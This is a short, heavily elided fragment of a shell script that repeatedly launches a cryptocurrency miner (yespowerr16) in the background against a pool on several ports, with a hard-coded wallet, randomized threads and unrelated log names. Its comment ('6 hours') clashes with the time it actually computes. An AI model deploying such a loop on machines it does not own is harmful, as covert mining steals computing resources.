...
end_time=$(( $(date +%s) + 60000*3600 ))  # 6 jam dari sekarang
while [ $(date +%s) -lt $end_time ]; do
  ...
  if [ -f $dynamic_sgr ]; then
    ...
    for port in $(seq 801 810); do
      ...
      nohup $dynamic_sgr -a yespowerr16 --pool $ip:$port -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC.$random_threads --timeout 120 -t $random_threads -p x --keepalive true > dance_$port_$timestamp.log 2>&1 &
      process_pid=$!
